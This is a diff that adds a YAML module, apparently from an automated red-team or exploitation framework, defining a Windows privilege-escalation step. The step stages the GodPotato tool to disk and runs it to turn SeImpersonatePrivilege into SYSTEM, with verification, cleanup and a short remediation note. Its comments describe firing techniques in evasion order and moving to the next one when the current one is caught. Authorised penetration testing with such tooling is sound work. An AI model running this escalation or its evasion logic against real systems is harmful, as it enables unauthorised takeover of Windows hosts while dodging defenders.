@@ -1,0 +1,44 @@
+# SeImpersonate → SYSTEM via GodPotato (native .exe rung)
+#
+# Part of the SeImpersonate → SYSTEM delivery ladder (family: seimpersonate).
+# The escalate loop fires ladder rungs in evasion-posture order and climbs to
+# the next family member when one is caught. This rung: GodPotato.exe staged to
+# disk, invoked by cmd.
+#
+# GodPotato (RPC/DCOM, .NET) — broad coverage: Server 2012–2022, Win8–11.
+technique: T1134.002
+name: SeImpersonate → SYSTEM (GodPotato)
+tactic: [privilege-escalation]
+platform: [windows]
+key: seimpersonate:godpotato
+family: seimpersonate
+delivery: native-exe
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
+execute:
+  command: |-
+    {{stage}}\GodPotato.exe -cmd "cmd /c whoami"
+  stages:
+    - name: GodPotato
+      as: '{{stage}}\GodPotato.exe'
+cleanup:
+  command: |-
+    del {{stage}}\GodPotato.exe
+verify:
+  success: "NT AUTHORITY"
+report:
+  vector_type: seimpersonate
+  description: >
+    GodPotato (RPC/DCOM, .NET) — broad coverage: Server 2012–2022, Win8–11.
+    Staged as a native .exe under the operator's Windows staging dir; the
+    escalate loop pushes it from the arsenal.
+  remediation: >
+    Don't grant SeImpersonate to non-tier-0 accounts. Service accounts that
+    need it (IIS worker, MSSQL service) should be isolated and monitored;
+    Credential Guard + protected process light for tier-0 processes helps
+    contain the blast radius.
+  refs: [T1134.002, GodPotato]
